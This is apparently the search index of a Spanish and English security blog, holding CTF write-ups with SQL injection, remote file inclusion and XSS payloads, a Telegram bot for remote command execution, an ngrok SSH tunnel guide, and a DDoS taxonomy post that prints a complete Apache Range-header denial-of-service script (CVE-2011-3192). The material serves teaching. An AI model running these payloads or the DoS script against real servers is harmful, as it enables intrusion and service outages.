+ \u0026#39; attempt;\u0026#39;); if (attempt == 0) { document[\u0026#39;getElementById\u0026#39;](\u0026#39;username\u0026#39;)[\u0026#39;disabled\u0026#39;] = true; document[\u0026#39;getElementById\u0026#39;](\u0026#39;password\u0026#39;)[\u0026#39;disabled\u0026#39;] = true; document[\u0026#39;getElementById\u0026#39;](\u0026#39;submit\u0026#39;)[\u0026#39;disabled\u0026#39;] = true; return false } } } We can analyze that the username is: EHC, and the password is hidden in Base64(atob ): 3thic4l_h4ck1ng. Then the login tells us that the flag is the password with the format flag {...} :\nflag{3thic4l_h4ck1ng} 3.- file_5e9666c7a0773f3785123f19986b4c5f\nthey give us a text file, which contains the following As we can see, it is a hexdump, we can reverse it with xxd:\nxxd -r file_5e9666c7a0773f3785123f19986b4c5f \u0026gt; myfile which gives us an image:\nand directly gives us the flag\nflag{FL4g_Facil_o_Difici1} 4.- SQLi\nwell\u0026hellip; he gave us a login with google captcha. I really hated this challenge and also my team, thanks @crhystamil :) hehehe, but let\u0026rsquo;s continue. Clearly it was about doing a SQL injection, however we tried with the typical admin:admin which gave us an answer of Buen_Intento_Pero_EsteNo_esEl_Flag, with this we could deduce that it was a valid user but not the one we want.\nAfter several attempts with MySql statements \u0026hellip; I tried Postgres with admin as password, to fulfill a valid query of course.\n-\u0026#39; UNION ALL SELECT NULL,NULL,current_database(),NULL-- It responds with ctf :D\nNow we continue trying to call the existing tables.\n-\u0026#39; UNION ALL SELECT NULL,NULL,table_name,NULL FROM information_schema.tables LIMIT 1 OFFSET 0-- response: users\nLuckily, the table we want skips on the first try, however, it does not allow us to make requests directly, but rather by encoding it.\nusers =\u0026gt; CHR(117)||CHR(115)||CHR(101)||CHR(114)||CHR(115) Which would be based on ASCII .\nIt would look something like this:\n-\u0026#39; UNION ALL SELECT NULL,NULL,column_name,NULL FROM information_schema.columns where table_name=CHR(117)||CHR(115)||CHR(101)||CHR(114)||CHR(115) LIMIT 1 OFFSET 0-- In the response we are enumerating increasing the OFFSET. Columns that can be useful to us:id, users,pass, flag. Now, we are only one step away from achieving it,however\u0026hellip;\n-\u0026#39; UNION ALL SELECT NULL,NULL,flag,NULL FROM ctf.public.users LIMIT 1 OFFSET 29-- The answer was until the 29th attempt, again, thanks @crhystamil .\nThe flag:\nDJC{Buen_Intento_esEl_Flag} 5.- Beware of running everything\nin this case it gives us a host in which it is executing even the images it has, which is obviously a bad practice, it gives us an open door to a RFI . From a remote server we try to locate the flag with a quick shell.\n\u0026lt;?php system(‚Äòls‚Äô); ?\u0026gt; This shows us the files in the current directory, in which there was a file that when read it gave us the flag just changing the URL for the file that contains it.\n-2s3d5f6g7g549fy4nfp734lk37-\nThe flag:\nflag{3hc_gr0up_h4ck1ng_Dragonjar} 6.- firmware analysis\nHe give us an image to analyze:open-hacking_151b4da179e4163e7e879da22e0c76e2.bin\nWhich we can use to extract the files they contain with Binwalk\nbinwalk -Me open-hacking_151b4da179e4163e7e879da22e0c76e2.bin So we can parse it and we get the flag:\nbandera{43320192606d672bf0db1280026c799902f03bdd} I think that would be :D However this are not all the problems, we could not complete them :( But and thanks to @crhystamil ! for build this fun CTF :D\nthe next write up is from CIDSI!\n-Hackers are People Too üòú\nSeries links The previous WriteUp(CIDSI Demo WriteUp ) WriteUp CTF CIDSI18 ","permalink":"https://drayko.github.io/post/writeup-ctfumss18/","tags":[{"LinkTitle":"CTF","RelPermalink":"/tags/ctf/"},{"LinkTitle":"WriteUp","RelPermalink":"/tags/writeup/"}],"title":"Write Up CTF UMSS 2018"},{"categories":[],"content":"Hey there!\nThis is the first post in a series covering CTF challenges held during the International Congress on Information Security (CIDSI), organized by the Agency for Electronic Government and Information and Communication Technologies (AGETIC), thanks to the efforts of the Cyber Incident Management Center (CGII). The event took place from November 29 to December 1, 2018.\nWe\u0026rsquo;ll start with the demo CTF challenge organized by CGII.\n1. Submit the flag\nThis is a simple challenge meant to demonstrate how the platform works.\nAll you need to do is submit the flag. The flag is: 327a6c4304ad5938eaf0efb6cc3e53dc\nSolution: The challenge literally gives you the flag:\n327a6c4304ad5938eaf0efb6cc3e53dc 2. Website\nNow it gets slightly more ‚Äúdifficult.‚Äù A developer from AGETIC left a hint on the event‚Äôs website. Link: https://www.cgii.gob.bo/eventos/cidsi2018/ Solution: Inspect the page‚Äôs source code using F12 or Ctrl+U.\nAnd there it is:\n8ddeb2027a8c79b3c46510a6dcef9dda 3. Admin Panel\nPoor security configurations.\nDevelopers often use default or easy-to-guess passwords.\nYou‚Äôre starting to explore your hacking skills and while visiting a company, you connect to their internal network. Surprise! You find the admin panel for their employee system. Your mission: log in as admin and get the flag.\nSolution: There are many common/default credentials (check this list ).\nLet‚Äôs try the classic: admin/admin\nNice! Here\u0026rsquo;s the flag:\n58FD79FEF76B8D579819C5FA615A25930F111C04627C3F374C5D7DF898A5FEADE1598AA0680BDF5B922ACBE396691FD1943A181E362F32FFCC0B29A6DD725BA0 4. Cracking\nCracking the hash\nMD5 is no longer considered secure.\nA hacker friend doing a security assessment got access to a user database. If he can break a hash and log in, he‚Äôll gain more privileges. Help him crack this outdated hash: 3cc31cd246149aec68079241e71e98f6\nSolution: Google the hash ‚Äî luckily, it‚Äôs been indexed. Tools like Hashcat or John The Ripper could help too.\nPa$$w0rd 5. Cracking 2\nYou‚Äôre chilling in a five-star hotel. A friend captures network traffic with Wireshark and happens to sniff a login to a staff portal with hotel promotions. The password looks ‚Äúencrypted‚Äù ‚Äî but you‚Äôve got this. The hash: ODcwMzM2NzA5ODUwMDUzNA==\nSolution: Looks like Base64. Tools to detect encodings are easy to find online.\nThe flag is:\n8703367098500534 6. Cracking 3\nWhile capturing traffic, you find what looks like a hash: MNQXA4TJMNXXE3TJN4======\nMission: decode it.\nHint: It‚Äôs ‚Äúhalf as hard‚Äù as Base64.\nSolution: The hint points to Base32. The flag is:\ncapricornio 7. Cracking 4\nA friend missed their first crypto class in a security postgrad course and needs help decoding this: ynivqnrftravny\nHint: If today were ‚ÄúTuesday the 13th,‚Äù things would be easier.\nSolution: This is a reference to ROT13 . Use any ROT13 decoder.\nThe flag:\nlavidaesgenial 8. Find user\nDevelopers often forget to sanitize user input.\nWe found a site that offers VIP invites to exclusive events. To access them, you need to trigger a JavaScript alert. Can you do it? If you‚Äôre the dev pro we think you are, the flag will be your reward.\nSolution: This suggests a basic XSS . Try something like:\n\u0026lt;script\u0026gt;alert(\u0026#34;XSS\u0026#34;)\u0026lt;/script\u0026gt; And voil√†!\nFollowed by:\nThe flag:\n11B0C9EBB6D5A0E0E4AE5B1F604B9E8111FEDF991173667AEB2D14F91ACC3B62FB6A5FD4E9AF37BAF09932150BF0D89A3B89F2B9F135347799D95DB38A4AC515 9. View profile\nProgressing nicely! A chocolate company is giving away chocolates to random users. To see the list, you need admin rights. Currently, you‚Äôre just a tech user. Your mission: gain access to the admin profile. Your reward? Chocolate ‚Äî and the flag, which is the admin‚Äôs contact info.\nSolution: Check the request headers when clicking ‚ÄúUpdate profile‚Äù:\nPOST /eventos/cidsi2018/ctfdemo/lessons/fdb94122d0f032821019c7edf09dc62ea21e25ca619ed9107bcc50e4a8dbc100 HTTP/1.1 Host: www.cgii.gob.bo Content-Type: application/x-www-form-urlencoded username=tecnico Change the username to:\nusername=administrador And there‚Äôs your flag:\nE762A4B454B64E50ED992465C1FBD424A5FB7184E9AA89B901D9ACD9B311AB3D927647D3BBC1BC52BDDEC560A005F72638F2C69D0D60169EBF621ABE8BF14A74 As we‚Äôd say in Bolivia\u0026hellip; esito ser√≠a. More write-ups will be published and linked soon. Stay tuned!\nHackers are People Too üòú\nSeries links\nCTF UMSS Write-Up CIDSI18 CTF Write-Up ","permalink":"https://drayko.github.io/post/writeup-democidsi18/","tags":[{"LinkTitle":"CTF","RelPermalink":"/tags/ctf/"},{"LinkTitle":"WriteUp","RelPermalink":"/tags/writeup/"}],"title":"Write-Up: CIDSI 2018 Demo CTF"},{"categories":[],"content":"","permalink":"https://drayko.github.io/manifest.json","tags":[],"title":""},{"categories":[],"content":"","permalink":"https://drayko.github.io/search/_index.de/","tags":[],"title":""},{"categories":[],"content":"","permalink":"https://drayko.github.io/search/_index.fr/","tags":[],"title":""},{"categories":[],"content":"","permalink":"https://drayko.github.io/search/_index.hi/","tags":[],"title":""},{"categories":[],"content":"","permalink":"https://drayko.github.io/search/_index.jp/","tags":[],"title":""},{"categories":[],"content":"","permalink":"https://drayko.github.io/search/_index.nl/","tags":[],"title":""},{"categories":[],"content":"","permalink":"https://drayko.github.io/search/_index.pl/","tags":[],"title":""},{"categories":[],"content":"","permalink":"https://drayko.github.io/search/_index.ru/","tags":[],"title":""},{"categories":[],"content":"","permalink":"https://drayko.github.io/search/_index.zh-cn/","tags":[],"title":""},{"categories":[],"content":"","permalink":"https://drayko.github.io/categories/with-slug/with-slug/","tags":[],"title":"Ëá™ÂÆö‰πâ Slug ÁöÑÂàÜÁ±ª"},{"categories":[],"content":"Este proyecto se trata de un bot de Telegram con la capacidad de ejecutar comandos de terminal desde tu cuenta de Telegram y con la respuesta del comando como mensajes.\nInicialmente este proyecto lo comenc√© por necesidades personales, pero decid√≠ liberarlo por la segura necesidad de muchos con el mismo problema que me encontr√©, y tomando como base un proyecto de Va5c0 .\nMuchas veces pasa en un pentest o m√°s aun un bug bounty, que se necesita enumerar los objetivos o procesos que toman mucho tiempo como ciertos tipos de escaneos de nmap, crackear alg√∫n hash. Y muchas veces por ese motivo paso a dejar ese proceso trabajando fij√°ndome si ya termino o no, dejando la computadora encendida, en algunas ocasiones sin nada m√°s que hacer, toco veces en que ya deb√≠a salir y apagar la computadora dejando todo el proceso previo sin resultados. Es un gran coste de tiempo y dinero.\nPor lo que ahora comparto este peque√±o proyecto de un bot(al que le bautice como Bot Bounty) que pueda ser utilizado tanto por una sola persona o varias, como una empresa que tenga esta misma necesidad para mejorar la productividad. Ya sea en una computadora, vps o una Raspberry. Conservando el grado de seguridad de que nadie m√°s que las personas que se autoricen a usar el bot podr√°n utilizarlo (por si alguien externo llegara a encontrarse con el bot y tratara de utilizarlo).\nEl bot tiene opciones predefinidas para un acceso r√°pido a informaci√≥n que puede ser √∫til para el uso del bot. Por mencionar algunos: el espacio en RAM disponible (opci√≥n info serv/RAM), o la IP publica que tiene el dispositivo en el que corre el bot.\nAdem√°s, con el comando /exec se puede ejecutar cualquier comando que est√© disponible en nuestra terminal del dispositivo a usar, por ejemplo:\nLimit√°ndose as√≠ para comandos que requieran interacci√≥n, como alguna instalaci√≥n sin forzar con el t√≠pico -y o logearse v√≠a SSH, por nombrar unos ejemplos.\nPor defecto en su primer release viene con comandos r√°pidos de amass y nmap, para empezar a usarlos en un pentest o bug bounty. por ejemplo, en amass, el comando es /amassenum, el cual llama a $ amass enum -d para realizar una enumeraci√≥n de subdominios:\nEn nmap tenemos un escaneo con los scripts, por default, sacar las versiones de los puertos encontrados, evitar realizar el descubrimiento del host (verificar si est√° vivo), y buscar en todos los puertos posibles; es decir: $ nmap -sC -sV -Pn -p-\nClaro que para lograr utilizar estos comandos deber√° estar instaladas las herramientas en el sistema que est√©n utilizando para correr el bot (adem√°s que se las pueda llamar directamente en consola)\nComo primer release, solamente se tienen esos comandos, sin embargo quedo a la espera de otros comandos de atajo para a√±adir al bot que sugieran. Adem√°s, si encuentran errores me pueden escribir o lanzar un issue en el repositorio.\nEl repositorio es el siguiente: Bot Bounty Configuraciones previas Para poder usarlo previamente deber√°n crearse un bot en Telegram reemplazar la API KEY que da por el valor que se especifica en el script en la l√≠nea 12.\nTOKEN = \u0026#39;XXXXXX:XXXXXXXXXXXXXXXX\u0026#39; Adem√°s de registrar el ID de usuario(s) que usaran el bot, en la l√≠nea 14:\nauthorizedUsers = [123456789, 987654321] Y ahora simplemente queda correr el script\n$ python3 bot.py Tips Si el output del comando es demasiado grande, debe guardarla en un archivo y sin output.\npor ejemplo:\n\\nmapadv example.com \u0026gt; resultadosExample.txt \\nmapadv example.com -oN resultadosExample.txt \\exec echo 'awesome bot!' \u0026gt; yesItIs.txt Para revisar posibles usuarios no autorizados tratando de usar el bot, se guarda un registro de todos los comandos ejecutados con detalles de usuario en el archivo logFileBot.txt\nY eso ser√≠a por ahora, espero sea bien recibido este trabajo.\n-Hackers are People Too üòú\n","permalink":"https://drayko.github.io/es/post/bot-bounty-telegram-bot/","tags":[{"LinkTitle":"Bot","RelPermalink":"/es/tags/bot/"},{"LinkTitle":"Featured","RelPermalink":"/es/tags/featured/"},{"LinkTitle":"Bug Bounty","RelPermalink":"/es/tags/bug-bounty/"},{"LinkTitle":"Pentest","RelPermalink":"/es/tags/pentest/"},{"LinkTitle":"Tool","RelPermalink":"/es/tags/tool/"}],"title":"Bot Bounty, un bot para Pentesting y Bug Bounty"},{"categories":[],"content":"Desde hace m√°s de 10 a√±os me dedico al mundo de la ciberseguridad, con la convicci√≥n de que mejorar la seguridad inform√°tica no es un gasto, sino una inversi√≥n necesaria para cualquier sociedad.\nActualmente, trabajo como consultor en ciberseguridad en una empresa suiza, realizando ejercicios de red teaming, an√°lisis ofensivo y defensivo, as√≠ como respuesta a incidentes para empresas, entidades bancarias y organizaciones cr√≠ticas.\nHe sido expositor, entrenador y mentor en diversos eventos y organizaciones, y a lo largo de mi trayectoria he recibido premios y reconocimientos en programas de bug bounty y otras √°reas de la ciberseguridad.\nCuento con certificaciones profesionales y formaci√≥n especializada de instituciones como INE, EC-COUNCIL, Google y CISCO. Adem√°s, colaboro de forma voluntaria analizando la seguridad de sitios web estatales.\nSoy especialista en Web Security Testing y Penetration Testing. He desarrollado herramientas propias y liderado proyectos enfocados en la seguridad de la informaci√≥n, siempre con una visi√≥n pr√°ctica y orientada a resultados.\nSi crees que puedo ayudarte o colaborar contigo en algo relacionado con seguridad inform√°tica, no dudes en escribirme por redes. ¬°Contame directamente qu√© necesitas!\nY si te gusta lo que hago o quieres apoyarme, puedes invitarme una cerveza en el bot√≥n de Buy Me a Beer! üç∫üòâ\nüç∫Buy me a Beer ","permalink":"https://drayko.github.io/es/about/","tags":[],"title":"Acerca de"},{"categories":[],"content":"Este post surgio por un trabajo de la universidad(para una Raspberry) sin embargo me sirvio con otras necesidades similares, para conectarse de manera remota sin necesidad de abrir puertos en el router.\nPara lograr una conexi√≥n SSH(u otro protocolo) fuera del √°rea local, de manera sencilla, me parece esta, por distintos motivos(podr√≠a ser habilitando puertos en el router, solo que esto seg√∫n la operadora puede llegar a ser muy dif√≠cil de lograr por sus pol√≠ticas entre otras cosas), entonces continuemos, se necesita instalar Ngrok En el caso de una Raspberry se necesita la versi√≥n Linux(ARM) o en consola:\nwget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip luego se hace el unzip tal como explica el tutorial de ngrok en consola:\nunzip ngrok-stable-linux-arm.zip Lo siguiente es registrarse y/o ingresar en ngrok, y una vez ah√≠ se van a este link donde les mostrara el token para su cuenta Una vez sabiendo su token ejecutan en su dispositivo:\n./ngrok authtoken XXXXXtuTokenAquiXXXXXXX con eso estar√≠a configurado, solo falta poner a la escucha el puerto 22, que se utiliza SSH, de la siguiente forma\n./ngrok tcp 22 es entonces cuando les muestra el Host y puerto al que apuntara Lo cual muestra en Forwarding la direcci√≥n TCP y puerto que nos habilitan para trabajar con nuestra Raspberry.\nEn este caso era 0.tcp.ngrok.io y puerto 17271, es decir que en vez de nuestra ip local y puerto por defecto(22), se debe especificar estos para acceder fuera del √°rea local a nuestro dipositivo, es decir:\nssh pi@0.tcp.ngrok.io -p17271 y esito ser√≠a :D En la pagina de ngrok pueden revisar la variedad e protocolos disponbles, con la misma logica\n-Hackers are People Too üòú\n","permalink":"https://drayko.github.io/es/post/ssh-connection-outside-the-local-network/","tags":[{"LinkTitle":"Redes","RelPermalink":"/es/tags/redes/"},{"LinkTitle":"SSH","RelPermalink":"/es/tags/ssh/"},{"LinkTitle":"Network","RelPermalink":"/es/tags/network/"},{"LinkTitle":"Ngrok","RelPermalink":"/es/tags/ngrok/"}],"title":"Conexi√≥n SSH fuera de la red local"},{"categories":[],"content":" Ataque de negaci√≥n de servicio distribuido(DDoS por sus siglas en ingl√©s, Distributed Denial of Service) se lleva a cabo generando un gran flujo de informaci√≥n desde varios puntos de conexi√≥n hacia un mismo punto de destino. En este Post se mostrar√°n 2 tipos de taxonom√≠as para clasificarlos por ataques y contramedidas, esto para resaltar similitudes, caracter√≠sticas y estrategias con la intenci√≥n de dise√±ar medidas al respecto.\nIntroducci√≥n El desarrollo y uso de las t√©cnicas de ataques DDoS se incrementaron en el transcurso de tiempo al igual que los atacantes constantemente modifican el enfoque de los mismos, este estudio trata de cubrir tanto los ataques conocidos como posibles modificaciones, divididas o niveles.\nAspectos generales que hace posible los ataques DDOS? seg√∫n como est√° dise√±ado Internet, sigue un paradigma end-to-end, por lo que, en una comunicaci√≥n en 2 v√≠as, no existe un tercero que pueda controlar la posibilidad de que se env√≠en paquetes maliciosos, para poder detenerlos inmediatamente. Adem√°s de la posibilidad de realizar IP Spoofing, lo cual dificulta a√∫n m√°s su control sin afectar clientes verdaderos del Host v√≠ctima.\nc√≥mo se realizan los ataques de DDOS? Para empezar, constan de distintas fases. Usualmente con la ayuda de escaneos autom√°ticos se buscan dispositivos que puedan llegar a ser vulnerables, en palabras simples, empieza el reclutamiento del ejercito; Teniendo identificados estos, son explotados o infectados de igual manera autom√°ticamente en lo general, para introducir el c√≥digo malicioso que servir√° posteriormente para con estos nuevos reclutas continuar con un mayor reclutamiento, yo lo llamar√≠a como una estafa piramidal.\npor que se realizan los ataques de DDOS? Usualmente son por motivos personales(venganza) o reputaci√≥n (conseguir respeto y fama). Sin embargo, tambi√©n son realizados por motivos econ√≥micos (da√±ar a un competidor) y pol√≠ticos (como una guerra en la que se podr√≠a dejar a todo un pa√≠s sin servicios de internet, un hecho que Rusia hace poco tomo en cuenta y trabaja en mejorar su independencia en servicios de internet y contramedidas ante esto).\nTaxonom√≠a de ataques DDOS DA: Degree of Automation (Grado de automatizaci√≥n) DA-1 Manual Las fases mencionadas anteriormente de escaneo y explotaci√≥n son realizadas por el atacante de forma manual en su completitud.\nDA-2 Semi-Automatic\n\u0026hellip;\nTaxonom√≠a de mecanismos de defensa DDOS\nPara m√°s detalles sobre cada clasificaci√≥n, aqu√≠ el art√≠culo.\nDemo Time | CVE-2011-3192 Para dar un ejemplo pr√°ctico de un ataque DDOS tome como caso de estudio el ataque denominado ApacheKiller, que permite a los atacantes realizar una denegaci√≥n de servicio (consumo de memoria y CPU) a trav√©s del Header Range que expresa m√∫ltiples rangos superpuestos, y que este tiene asignado el CVE-2011-3192. Tiene como versiones afectadas en Apache HTTP Server 1.3.x, 2.0.x hasta 2.0.64 y 2.2.x hasta 2.2.19. En mi caso use Window$7 como Host Victima con Apache v2.2.15 y con un script hecho en python para realizar el ataque.\nPaso 1 Instalar y correr una versi√≥n Apache vulnerable descrita previamente Paso 2 Realice un peque√±o test, para que puedan observar a detalle el Request, en el que adem√°s nos manda la versi√≥n de Apache que se utiliza, esto en un Test ya remunerado o Bug Bounty puede sernos de mucha utilidad claramente. Paso 3 Con el script realizado en Python por Miroslav Stampar hacemos el testeo\n#!/usr/bin/env python import optparse, os, re, socket, threading, time, urllib, urllib2, urlparse NAME = \u0026#34;KillApachePy (Range Header DoS CVE-2011-3192)\u0026#34; VERSION = \u0026#34;0.1c\u0026#34; AUTHOR = \u0026#34;Miroslav Stampar (@stamparm)\u0026#34; LICENSE = \u0026#34;Public domain (FREE)\u0026#34; SHORT = \u0026#34;You\u0026#39;ll typically have to wait for 10-20 iterations before first connection timeouts. More complex/bigger the page the better\u0026#34; REFERENCE = \u0026#34;http://seclists.org/fulldisclosure/2011/Aug/175\u0026#34; SLEEP_TIME = 3 # time to wait for new thread slots (after max number reached) RANGE_NUMBER = 1024 # number of range subitems forming the DoS payload USER_AGENT = \u0026#34;KillApachePy (%s)\u0026#34; % VERSION def attack(url, user_agent=None, method=\u0026#39;GET\u0026#39;, proxy=None): if \u0026#39;://\u0026#39; not in url: url = \u0026#34;http://%s\u0026#34; % url host = urlparse.urlparse(url).netloc user_agent = user_agent or USER_AGENT if proxy and not re.match(\u0026#39;\\Ahttp(s)?://[^:]+:[0-9]+(/)?\\Z\u0026#39;, proxy, re.I): print \u0026#34;(x) Invalid proxy address used\u0026#34; exit(-1) proxy_support = urllib2.ProxyHandler({\u0026#39;http\u0026#39;: proxy} if proxy else {}) opener = urllib2.build_opener(proxy_support) urllib2.install_opener(opener) class _MethodRequest(urllib2.Request): \u0026#39;\u0026#39;\u0026#39; Create any HTTP (e.g. HEAD/PUT/DELETE) request type with urllib2 \u0026#39;\u0026#39;\u0026#39; def set_method(self, method): self.method = method.upper() def get_method(self): return getattr(self, \u0026#39;method\u0026#39;, urllib2.Request.get_method(self)) def _send(check=False): \u0026#39;\u0026#39;\u0026#39; Send the vulnerable request to the target \u0026#39;\u0026#39;\u0026#39; if check: print \u0026#34;(i) Checking target for vulnerability...\u0026#34; payload = \u0026#34;bytes=0-,%s\u0026#34; % \u0026#34;,\u0026#34;.join(\u0026#34;5-%d\u0026#34; % item for item in xrange(1, RANGE_NUMBER)) try: headers = { \u0026#39;Host\u0026#39;: host, \u0026#39;User-Agent\u0026#39;: USER_AGENT, \u0026#39;Range\u0026#39;: payload, \u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate\u0026#39; } req = _MethodRequest(url, None, headers) req.set_method(method) response = urllib2.urlopen(req) if check: return response and (\u0026#39;byteranges\u0026#39; in repr(response.headers.headers) or response.code == 206) except urllib2.URLError, msg: if \u0026#39;timed out\u0026#39; in str(msg): print \u0026#34;\\r(i) Server seems to be choked (\u0026#39;%s\u0026#39;)\u0026#34; % msg else: print \u0026#34;(x) Connection error (\u0026#39;%s\u0026#39;)\u0026#34; % msg if check or \u0026#39;Forbidden\u0026#39; in str(msg): os._exit(-1) except Exception, msg: raise try: if not _send(check=True): print \u0026#34;(x) Target does not seem to be vulnerable\u0026#34; else: print \u0026#34;(o) Target seems to be vulnerable\\n\u0026#34; quit = False while not quit: threads = [] print \u0026#34;(i) Creating new threads...\u0026#34; try: while True: thread = threading.Thread(target=_send) thread.start() threads.append(thread) except KeyboardInterrupt: quit = True raise except Exception, msg: if \u0026#39;new thread\u0026#39; in str(msg): print \u0026#34;(i) Maximum number of new threads created (%d)\u0026#34; % len(threads) else: print \u0026#34;(x) Exception occured (\u0026#39;%s\u0026#39;)\u0026#34; % msg finally: if not quit: print \u0026#34;(o) Waiting for %d seconds to acquire new threads\u0026#34; % SLEEP_TIME time.sleep(SLEEP_TIME) print except KeyboardInterrupt: print \u0026#34;\\r(x) Ctrl-C was pressed\u0026#34; os._exit(1) def main(): print \u0026#34;%s #v%s\\n by: %s\\n\\n(Note(s): %s)\\n\u0026#34; % (NAME, VERSION, AUTHOR, SHORT) parser = optparse.OptionParser(version=VERSION) parser.add_option(\u0026#34;-u\u0026#34;, dest=\u0026#34;url\u0026#34;, help=\u0026#34;Target url (e.g. \\\u0026#34;http://www.target.com/index.php\\\u0026#34;)\u0026#34;) parser.add_option(\u0026#34;--agent\u0026#34;, dest=\u0026#34;agent\u0026#34;, help=\u0026#34;User agent (e.g. \\\u0026#34;Mozilla/5.0 (Linux)\\\u0026#34;)\u0026#34;) parser.add_option(\u0026#34;--method\u0026#34;, dest=\u0026#34;method\u0026#34;, default=\u0026#39;GET\u0026#39;, help=\u0026#34;HTTP method used (default: GET)\u0026#34;) parser.add_option(\u0026#34;--proxy\u0026#34;, dest=\u0026#34;proxy\u0026#34;, help=\u0026#34;Proxy (e.g. \\\u0026#34;http://127.0.0.1:8118\\\u0026#34;)\u0026#34;) options, _ = parser.parse_args() if options.url: result = attack(options.url, options.agent, options.method, options.proxy) else: parser.print_help() if __name__ == \u0026#34;__main__\u0026#34;: main() Y configurandolo con el proxy de Burp Suite quedar√≠a algo as√≠ en terminal:\nroot@lab:~# python Apachekiller.py -u 192.168.100.58 --proxy=\u0026#34;http://127.0.0.1:8080\u0026#34; KillApachePy (Range Header DoS CVE-2011-3192) #v0.1c by: Miroslav Stampar (@stamparm) (Note(s) You\u0026#39;ll typically have to wait for 10-20 iterations before first connection timeouts. More complex/bigger the page the better) (i) Checking target for vulnerability... (o) Target seems to be vulnerable (1) Creating new threads una vez ejecutado esto regresemos a ver nuestro servidor: Como pueden ver, el Uso de CPU esta hasta el tope, por lo cual podemos evidenciar la vulnerabilidad a la que es susceptible estas versiones de Apache sin embargo analicemos las peticiones que se enviaron. c√≥mo ven, se env√≠a peticiones con Range superpuestos por lo cual nuestro servidor debe procesar todo esto en mayor tiempo (consumiendo as√≠ recursos), lo cual a gran escala resulta fatal. Como tal este ser√≠a un ataque DOS, que sin embargo logro un 100% de Uso de CPU, ahora con un ataque simultaneo con m√°s maquinas (DDOS), podr√≠a resultarnos en una pantalla azul, dejando abajo el servidor.\nEste ser√≠a un ejemplo en nuestra Taxonom√≠a de un EW-1(Exploited Weakness to Deny Services:Semantic) dado que el ataque aprovecha un bug que result√≥ en estas versiones de Apache.\nUna soluci√≥n a este problema ser√≠a una actualizaci√≥n del servidor y/o parches si los tuviera, tambi√©n un WAF como modSecurity. Por esto la taxonom√≠a a nuestro mecanismo de defensa contra el DDOS seria AL-1:PG-1:ST-1(Activity Level:Preventive - Prevention Goal:Attack Prevention - Secured Target: System Security).\nEso ser√≠a, si tuvieran dudas no duden en escribir. -Hackers are People Too üòú\n","permalink":"https://drayko.github.io/es/post/taxonomy-of-ddos/","tags":[{"LinkTitle":"Redes","RelPermalink":"/es/tags/redes/"},{"LinkTitle":"Curiosidades","RelPermalink":"/es/tags/curiosidades/"},{"LinkTitle":"Network","RelPermalink":"/es/tags/network/"},{"LinkTitle":"Paper","RelPermalink":"/es/tags/paper/"}],"title":"Taxonom√≠a de ataques DDoS y mecanismos de defensa DDoS"},{"categories":[],"content":"Si bien este post no es algo t√©cnico como acostumbro, me parece bastante interesante.\nMandaron en la lista de correos de la Comunidad de Software Libre de Bolivia un enlace a un post en medium donde se listaban algunos de los art√≠culos documentados sobre las primeras computadoras en cada pa√≠s, y descubrir que en esa lista estaba Bolivia fue interesante(el art√≠culo est√° entre la biblioteca de la ACM).\nLa primera computadora seg√∫n este art√≠culo es una IBM 1440 (como se la ve en la imagen), la cual fue adquirida por la Corporaci√≥n Minera Boliviana(COMIBOL).\nEl art√≠culo fue publicado en 1969 pero en el mismo explica que el departamento creado para usar la m√°quina ya se encontraba en funcionamiento 3,5 a√±os por lo que deduzco que la computadora lleg√≥ el a√±o 1965 o 1966(si alguno podr√≠a confirmar esto ser√≠a incre√≠ble).\nFuera de esto, lo complicado a sus inicios como casi en cualquier equipo novedoso fue encontrar personal capacitado para el uso de esta m√°quina que estaba dispuesta para los procesos contables de la corporaci√≥n, cosa que pon√≠a en duda la utilidad dado el costo que supuso la computadora. Es por esto que se hicieron pruebas de aptitud para su manejo en donde 500 personas postularon pero solamente 6 aprobaron. Mandaron a este personal a capacitarse y tambi√©n en el uso de COBOL y FORTRAN IV para que pueda ser usada en el procesamiento de datos.\nA pesar de que fue un gran avance tecnol√≥gico, a√∫n se ten√≠an dudas sobre este adem√°s de criticado, por que el personal previo que realizaba este trabajo contable a mano, tuvo que ser despedido pr√°cticamente.\nEl coste del avance tecnol√≥gico para ciertos trabajos o carreras sigue siendo devastador hasta el d√≠a de hoy, por la automatizaci√≥n de procesos y a√∫n m√°s cuando ya se ve el uso de la \u0026ldquo;Inteligencia Artificial\u0026rdquo; en tantas √°reas que parece ya innecesario el humano.\nSin embargo me parece que no es el final del camino para todos, es ley de la vida y naturaleza que el m√°s fuerte o el que se adapte m√°s r√°pido sobrevive; en este caso estar de la mano con la tecnolog√≠a, solo no hay que rendirse.\n-Hackers are People Too\n","permalink":"https://drayko.github.io/es/post/the-first-computer-in-bolivia/","tags":[{"LinkTitle":"Curiosidades","RelPermalink":"/es/tags/curiosidades/"}],"title":"La primera computadora en Bolivia"},{"categories":[],"content":"Este CTF estuvo compuesto por 74 equipos de universidades convocadas a nivel nacional para nivel de pregrado y posgrado en el Congreso Internacional De Seguridad Inform√°tica (CIDSI) que fue organizado por la Agencia de Gobierno Electr√≥nico y Tecnolog√≠as de Informaci√≥n y Comunicaci√≥n (AGETIC) gracias a las gestiones del Centro de Gesti√≥n de Incidentes Inform√°ticos(CGII) realizado del 29 de Noviembre al 1 de Diciembre del 2018.\nTerminando esta serie, y como mencione en el anterior post , en este participamos en Equipo como Dark Army con Israel , Rafael y mi persona , logrando resolver todos los retos; Sin embargo no pudimos recuperar todos los enunciados o las flags en especifico(Como fueron escritas en forma literal en el evento), pero est√°n explicadas tal y como lo resolvimos en el CTF, el cual duro dos medias jornadas.\nNivel 1 1.1. An√°lisis de trafico 1 Bienvenidos. Una compa√±√≠a dedicada a la banca los acaba de contratar para poder realizar un an√°lisis de tr√°fico. El problema radica en que hay un empleado que esta filtrando direcciones de correo electr√≥nico, al mismo tiempo otro empleado comenz√≥ a pasar passwords que tienen privilegios de modificaci√≥n de los salarios de los empleados. Tu misi√≥n es encontrar esa contrase√±a\nPues para empezar nos dan una captura de trafico , en la cual al buscar con Wireshark encontramos una petici√≥n con el usuario y contrase√±a.\nentonces la flag es:\n007 1.2 Web crawlers Lastimosamente motores de b√∫squeda est√°n indexando muchos p√°ginas de este sitio web que son confidenciales para nosotros ! Sabes cual es el archivo para evitar que esto siga pasando ? ¬ø Nadie quiere sitios totalmente indexados verdad?\nEsto es bastante f√°cil, la Flag esta dentro de los robots.txt , el cual proporciona informaci√≥n a los rastreadores de buscadores sobre las p√°ginas o los archivos que pueden solicitar o no de tu sitio web.\nhttp://url/robots.txt 1.3 Backups Petr√≥leos del Caribe nos pidi√≥ guardar un backup de su 